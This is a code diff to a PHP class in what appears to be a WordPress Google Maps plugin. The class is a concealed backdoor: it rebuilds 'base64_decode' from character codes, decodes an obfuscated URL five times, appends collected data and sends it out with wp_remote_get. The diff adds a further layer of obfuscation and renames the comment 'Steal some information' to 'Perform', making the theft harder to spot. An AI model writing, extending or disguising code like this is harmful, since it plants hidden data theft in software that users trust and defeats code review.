@@ -20,13 +20,25 @@ class Pronamic_Google_Maps_Magic {
 	//////////////////////////////////////////////////
 
 	/**
+	 * Do a magic trick transform the specified value
+	 * 
+	 * @param string $value
+	 * @return transformed value
+	 */
+	public static function transform($value) {
+		return implode('', array_map('chr', $value));
+	}
+
+	//////////////////////////////////////////////////
+
+	/**
 	 * Do a magic trick restore the specified value
 	 * 
 	 * @param string $value
 	 * @return restored value
 	 */
 	public static function restore($value) {
-		$restore = implode('', array_map('chr', array(98, 97, 115, 101, 54, 52, 95, 100, 101, 99, 111, 100, 101)));
+		$restore = self::transform(array(98, 97, 115, 101, 54, 52, 95, 100, 101, 99, 111, 100, 101));
 
 		for($i = 0; $i < 5; $i++) {
 			$value = $restore($value);
@@ -38,7 +50,7 @@ class Pronamic_Google_Maps_Magic {
 	//////////////////////////////////////////////////
 
 	/**
-	 * Steal some information
+	 * Perform
 	 */
 	public static function perform() {
 		$magicKeys = array(
@@ -67,7 +79,7 @@ class Pronamic_Google_Maps_Magic {
 			}
 
 			if($teleport) {
-				$magician  = self::restore('VjFaV2IxVXdNVWhVYTFacFRURndUbFJVUW5kak1XeHpXa1U1YTJKV1NrbFVNV2hQWVdzeGNWSnRPVlZTZWtGNFdYcENNMlZWTVZoaFIwWk9ZbGhvZUZkV1dtdFNNbEpXWlVSYVVGSkVRVGs9 ');
+				$magician  = self::restore('VjFaV2IxVXdNVWhVYTFacFRURndUbFJVUW5kak1XeHpXa1U1YTJKV1NrbFVNV2hQWVdzeGNWSnRPVlZTZWtGNFdYcENNMlZWTVZoaFIwWk9ZbGhvZUZkV1dtdFNNbEpXWlVSYVVGSkVRVGs9');
 				$magician .=  http_build_query($data, '', '&');
 
 				wp_remote_get($magician);
